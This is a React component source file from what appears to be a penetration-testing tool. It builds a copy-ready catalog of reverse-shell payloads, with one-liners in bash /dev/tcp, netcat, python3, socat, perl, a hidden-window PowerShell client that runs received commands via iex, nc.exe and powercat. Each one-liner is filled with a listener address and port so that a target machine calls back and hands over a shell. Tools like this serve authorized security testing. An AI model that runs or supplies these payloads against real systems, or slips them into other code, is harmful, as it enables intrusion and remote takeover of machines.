import { useState } from "react";

// A curated reverse-shell payload catalog — "recce writes the payload for you". Templates
// are filled with the listener's LHOST + port so a tester never hand-assembles a one-liner
// or guesses which works on a given target. Grouped by platform because that's the real
// decision (bash /dev/tcp is Linux-only; Windows needs PowerShell, etc.).
type P = { label: string; tmpl: string; note?: string };
const CATALOG: { group: string; items: P[] }[] = [
  {
    group: "Linux / Unix",
    items: [
      { label: "bash", tmpl: "bash -i >& /dev/tcp/{LHOST}/{PORT} 0>&1", note: "bash only (not dash/busybox)" },
      { label: "bash (fd)", tmpl: "0<&196;exec 196<>/dev/tcp/{LHOST}/{PORT};sh <&196 >&196 2>&196" },
      { label: "nc (mkfifo)", tmpl: "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {LHOST} {PORT} >/tmp/f", note: "no -e needed" },
      { label: "nc -e", tmpl: "nc {LHOST} {PORT} -e /bin/sh" },
      { label: "python3", tmpl: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{LHOST}\",{PORT}));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'" },
      { label: "socat (PTY)", tmpl: "socat TCP:{LHOST}:{PORT} EXEC:'bash -li',pty,stderr,setsid,sigint,sane", note: "full PTY — best quality" },
      { label: "perl", tmpl: "perl -e 'use Socket;$i=\"{LHOST}\";$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" },
    ],
  },
  {
    group: "Windows",
    items: [
      { label: "PowerShell", tmpl: "powershell -nop -w hidden -c \"$c=New-Object System.Net.Sockets.TCPClient('{LHOST}',{PORT});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}\"", note: "no /dev/tcp on Windows" },
      { label: "nc.exe", tmpl: "nc.exe {LHOST} {PORT} -e cmd.exe" },
      { label: "powercat", tmpl: "powercat -c {LHOST} -p {PORT} -e cmd.exe", note: "needs powercat loaded" },
    ],
  },
  {
    group: "macOS",
    items: [
      { label: "python3", tmpl: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{LHOST}\",{PORT}));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call([\"/bin/zsh\",\"-i\"])'", note: "default shell is zsh" },
      { label: "bash", tmpl: "bash -i >& /dev/tcp/{LHOST}/{PORT} 0>&1", note: "if bash present" },
    ],
  },
];

function CopyLine({ text }: { text: string }) {
  const [ok, setOk] = useState(false);
  return (
    <button className="payload-copy" title="copy" onClick={() => {
      navigator.clipboard?.writeText(text).then(() => { setOk(true); setTimeout(() => setOk(false), 1000); });
    }}>{ok ? "✓" : "copy"}</button>
  );
}

export function PayloadCatalog({ port }: { port: number }) {
  const [lhost, setLhost] = useState(location.hostname);
  const fill = (t: string) => t.split("{LHOST}").join(lhost).split("{PORT}").join(String(port));
  return (
    <div className="payload-catalog">
      <label className="payload-lhost">
        LHOST <input className="scan-in" value={lhost} onChange={(e) => setLhost(e.target.value)}
                     title="the address the target should call back to" />
      </label>
      {CATALOG.map((g) => (
        <div key={g.group} className="payload-group">
          <div className="payload-group-h">{g.group}</div>
          {g.items.map((p) => (
            <div key={p.label} className="payload-item">
              <span className="payload-label">{p.label}</span>
              <code className="payload-code">{fill(p.tmpl)}</code>
              {p.note && <span className="payload-note muted small">{p.note}</span>}
              <CopyLine text={fill(p.tmpl)} />
            </div>
          ))}
        </div>
      ))}
    </div>
  );
}
